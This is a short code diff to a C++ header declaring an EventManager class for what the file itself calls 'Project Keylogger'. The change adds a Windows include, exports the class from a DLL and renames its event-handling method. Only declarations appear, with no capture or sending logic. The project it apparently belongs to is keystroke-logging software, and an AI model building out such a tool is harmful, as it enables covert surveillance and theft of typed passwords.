@@ -1,27 +1,19 @@
 /**
- * Project Keylogger
+ *					Project Keylogger
  */
 
 
-#ifndef _EVENTMANAGER_H
-#define _EVENTMANAGER_H
+#ifndef				_EVENTMANAGER_H
+#define				_EVENTMANAGER_H
 
-#include "Keylogger.h"
+#include			<Windows.h>
 
-class EventManager {
+#include			"Keylogger.h"
+
+class __declspec(dllexport) 			EventManager {
 public: 
-    
-    /**
-     * @param Keylogger&
-     */
     EventManager(Keylogger&);
-    
-    /**
-     * Call the Event Factory to create an event depending on parameters. 
-     * @param LPARAM
-     * @param WPARAM
-     */
-    void HandleEvent(LPARAM, WPARAM);
+    void handleEvent(const LPARAM, const WPARAM);
 private: 
     Keylogger& _keylogger;
 };
